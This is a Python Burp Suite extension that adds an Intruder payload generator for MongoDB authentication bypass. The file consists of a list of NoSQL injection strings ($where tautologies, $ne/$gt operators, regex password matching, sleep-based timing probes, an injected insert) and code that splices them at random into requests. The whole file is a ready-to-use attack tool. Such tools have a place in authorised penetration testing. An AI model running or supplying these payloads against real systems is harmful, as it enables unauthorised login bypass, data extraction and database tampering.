from burp import IBurpExtender
from burp import IIntruderPayloadGeneratorFactory
from burp import IIntruderPayloadGenerator
from java.util import List, ArrayList

import random

try_num = 19
payload_list = [
  "true, $where: '1 == 1'",
  ", $where: '1 == 1'",
  "$where: '1 == 1'",
  "', $where: '1 == 1'",
  "1, $where: '1 == 1'",
  "{ $ne: 1 }",
  "', $or: [ {}, { 'a':'a",
  "' } ], $comment:'successful MongoDB injection'",
  "db.injection.insert({success:1});",
  "db.injection.insert({success:1});return 1;db.stores.mapReduce(function() { { emit(1,1",
  "|| 1==1",
  "' && this.password.match(/.*/)//+%00",
  "' && this.passwordzz.match(/.*/)//+%00",
  "'%20%26%26%20this.password.match(/.*/)//+%00",
  "'%20%26%26%20this.passwordzz.match(/.*/)//+%00",
  "{$gt: ''}",
  '{"$gt": ""}',
  "[$ne]=1",
  "';sleep(5000);",
  "';sleep(5000);'",
  "';sleep(5000);+'",
  "';it=new%20Date();do{pt=new%20Date();}while(pt-it<5000);",
  "';return 'a'=='a' && ''=='",
  "0;return true",
]

class BurpExtender(IBurpExtender, IIntruderPayloadGeneratorFactory):
    def registerExtenderCallbacks(self, callbacks):
        self._callbacks = callbacks
        self._helpers = callbacks.getHelpers()

        callbacks.registerIntruderPayloadGeneratorFactory(self)
        return
    
    def getGeneratorName(self):
        return "MongoDB Auth_Bypass Payload Generator"

    def createNewInstance(self, attack):
        return BurpFuzzer(self, attack)


class BurpFuzzer(IIntruderPayloadGenerator):
    def __init__(self, extender, attack):
        self._extender = extender
        self._helpers = extender._helpers
        self._attack = attack
        self.max_payloads = try_num
        self.num_iterations = 0
        self.num_tried = list()

        return
    
    def hasMorePayloads(self):
        if (self.num_iterations == self.max_payloads) or (len(self.num_tried) == len(payload_list)):
            return False
        else:
            return True
    
    def getNextPayload(self, current_payload):
        payload = ''.join(chr(x) for x in current_payload)

        payload = self.mutate_payload(payload)

        self.num_iterations += 1

        return payload
    
    def reset(self):
        self.num_iterations = 0
        return
    
    def mutate_payload(self, original_payload):
        offset = random.randint(0, len(original_payload) - 1)
        front, back = original_payload[:offset], original_payload[offset:]
        
        
        while True:
            sample_number = random.randint(0, len(payload_list) -1)
            if sample_number not in self.num_tried:
                    self.num_tried.append(sample_number)
                    break
        front += payload_list[sample_number]

        return front + back